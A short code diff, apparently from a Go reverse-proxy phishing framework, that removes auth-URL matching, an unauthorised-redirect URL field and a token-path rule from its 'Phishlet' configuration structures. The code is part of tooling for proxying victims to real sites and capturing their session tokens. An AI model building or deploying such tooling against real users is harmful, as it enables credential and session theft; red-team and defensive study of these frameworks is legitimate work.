@@ -43,13 +43,11 @@ type Phishlet struct {
 	ForcePosts  []ForcePost
 	Intercepts  []InterceptRule
 	JSInjects   []JSInject
-	AuthURLs    []*regexp.Regexp
 
 	// Operator config (persisted to SQLite)
 	BaseDomain  string
 	DNSProvider string
 	Hostname    string
-	UnauthURL   string
 	SpoofURL    string
 	Enabled     bool
 	Hidden      bool
@@ -62,7 +60,6 @@ func (p *Phishlet) applyOperatorConfig(src *Phishlet) {
 	p.BaseDomain = src.BaseDomain
 	p.DNSProvider = src.DNSProvider
 	p.Hostname = src.Hostname
-	p.UnauthURL = src.UnauthURL
 	p.SpoofURL = src.SpoofURL
 	p.Enabled = src.Enabled
 	p.Hidden = src.Hidden
@@ -102,16 +99,6 @@ func (p *Phishlet) FindProxyHost(phishHost string) *ProxyHost {
 		}
 	}
 	return nil
-}
-
-// MatchesAuthURL reports whether rawURL matches any of the phishlet's auth URL patterns.
-func (p *Phishlet) MatchesAuthURL(rawURL string) bool {
-	for _, authURL := range p.AuthURLs {
-		if authURL.MatchString(rawURL) {
-			return true
-		}
-	}
-	return false
 }
 
 // ProxyHost maps a phishing subdomain to a real upstream host.
@@ -169,7 +156,6 @@ const (
 type TokenRule struct {
 	Type     TokenType
 	Domain   string
-	Path     *regexp.Regexp
 	Name     *regexp.Regexp
 	Search   *regexp.Regexp
 	HTTPOnly bool
